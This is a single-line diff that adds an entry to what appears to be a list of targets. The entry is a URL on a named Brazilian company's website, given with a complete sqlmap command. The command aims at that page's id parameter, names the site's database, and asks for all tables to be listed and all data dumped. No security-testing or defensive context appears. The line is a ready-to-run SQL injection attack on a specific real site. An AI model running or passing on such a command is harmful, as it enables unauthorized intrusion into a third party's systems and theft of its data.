@@ -1,0 +1,1 @@
+https://www.sowx.com.br/solucoes-detalhe.php?id=1 (GET)  # sqlmap.py -u https://www.sowx.com.br/solucoes-detalhe.php?id=1 -D sowx --tables --dump-all --threads 5 -v3
